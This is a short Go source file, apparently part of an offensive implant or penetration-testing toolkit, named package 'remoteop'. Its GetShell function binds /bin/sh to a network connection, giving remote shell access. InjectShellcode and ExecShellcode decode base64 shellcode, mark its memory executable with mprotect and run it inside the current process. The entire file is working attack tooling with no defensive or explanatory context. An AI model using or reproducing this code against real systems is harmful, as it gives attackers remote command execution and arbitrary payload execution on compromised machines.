// +build linux darwin freebsd !windows

package remoteop

import (
	"encoding/base64"
	"net"
	"os/exec"
	"golang.org/x/sys/unix"
	"unsafe"
)

// GetShell returns an *exec.Cmd instance which will run /bin/bash
func GetShell(conn net.Conn) {
	cmd := exec.Command("/bin/sh")
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}

// InjectShellcode decodes base64 encoded shellcode
// and injects it in the same process.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			ExecShellcode(shellcode)
		}
	}
	return
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(unix.Getpagesize()-1))))[:unix.Getpagesize()]
}

// ExecShellcode sets the memory page containing the shellcode
// to R-X, then executes the shellcode as a function.
func ExecShellcode(shellcode []byte) {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := getPage(shellcodeAddr)
	_ = unix.Mprotect(page, unix.PROT_READ|unix.PROT_EXEC)
	shellPtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
	go shellcodeFuncPtr()
}